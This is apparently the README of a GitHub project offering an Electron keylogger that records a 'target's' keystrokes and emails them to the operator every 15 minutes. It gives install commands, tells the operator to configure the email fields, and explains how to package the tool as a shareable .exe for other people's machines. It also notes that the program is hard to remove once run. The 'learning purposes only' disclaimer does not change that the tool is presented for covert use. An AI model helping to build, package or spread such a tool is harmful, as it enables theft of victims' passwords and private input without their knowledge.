# Electron Keylogger
Tracks the keystrokes of your target and sends them to you every 15 minutes in an email.

## Installation
```bash
git clone https://github.com/syztumGG/electron-keylogger
cd electron-keylogger
npm i
```

## Usage
Change the values in the email fields and run the program with `npm start`. If you want to package it into a `.exe` that you can share with people and whatnot, use `electron-packager . [name] [--icon="icon.ico]"` (bracketed things are optional).

### Notes
* This was only tested on Windows. I have no idea how it will perform on Mac and Linux.
* This is a pesky thing to get off your system once you run the compiled `.exe` (at least I think and hope that it is), so be wary when using on other peoples' machines.
* This repository is for learning purposes only. Use at your own risk.

### License
• [MIT](https://github.com/syztumGG/electron-keylogger/blob/master/LICENSE.md) © 2019 [Sam Gilburg](https://github.com/syztumGG)